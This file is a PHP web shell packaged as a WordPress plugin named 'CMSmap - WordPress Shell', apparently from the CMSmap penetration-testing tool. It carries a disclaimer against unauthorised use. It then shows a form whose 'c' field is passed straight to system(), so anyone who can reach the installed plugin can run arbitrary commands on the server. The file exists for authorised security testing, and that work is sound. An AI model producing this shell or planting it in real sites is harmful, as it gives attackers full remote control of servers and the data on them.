<?php
/**
 * Plugin Name: CMSmap - WordPress Shell
 * Plugin URI: https://github.com/m7x/cmsmap/
 * Description: Simple WordPress Shell - Usage of CMSmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developer assumes no liability and is not responsible for any misuse or damage caused by this program.
 * Version: 1.0
 * Author: CMSmap
 * Author URI: https://github.com/m7x/cmsmap/
 * License: GPLv2
 */
?>
<form action="" method=post>
Command: <input name=c type=text size=100 value="<?php if (isset($_POST["c"])){print(stripslashes($_POST["c"]));} ?>">
<input type=submit>
</form>
<pre>
<?php if (isset($_POST["c"])){system(stripslashes($_POST["c"])." 2>&1");} ?>
</pre>